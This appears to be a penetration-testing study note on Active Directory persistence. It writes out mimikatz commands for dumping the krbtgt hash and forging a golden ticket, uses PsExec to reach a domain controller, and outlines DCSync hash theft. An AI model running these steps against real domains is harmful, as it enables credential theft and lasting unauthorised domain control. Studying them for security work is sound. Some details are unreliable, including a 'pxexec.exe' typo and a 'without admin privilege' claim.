AD Persistence

to ensure no loss of access to compromised machine

Use traditional persistence methods in AD env, to gain AD-specific persistence

# Golden Tickets

If we are able to get the krbtgt password hash, we can create our own 'self-made' custom TGTs (golden tickets)

E.g. we can create a TGT stating a non-privileged user is actually a member of the Domain Admins group

In mimikatz (without admin privilege)

> privilege::debug
> 
> lsadump::lsa /patch

Once done with obtaining the krbtgt hash, we create the golden ticket for the user we want to have it

> kerberos::purge
> 
> whoami /user # Get SID; Actually shown in Domain record during lsadump::lsa (shown above)
> 
> kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
> 
> misc::cmd # to allow cmd.exe to be executed

take note of the User ID and Group ID it is in the admin groups

Then use PsExec

> pxexec.exe \\\dc01 cmd.exe

# Domain Controller Synchronisation

Steal all the password hashes for all admin users in the domain (use mimikatz and dump all the password hash of every user, or steal a copy of the NTDS.dit DB file)

- Leaves a access trail;
- May require us to upload tools to the server

Alternative way is to abuse AD functionality to capture hashes remotely from a workstation

In production env, domains usually have more than one DC to provide redundancy. A DC may request an update for a specific object (e.g. account) with the IDL_DRSGetNCChanges API

- DC receiving the request does not verify the request came from where; only associates SID has appropriate privileges
- Can use a member of Domain Admins to request and it will succeed
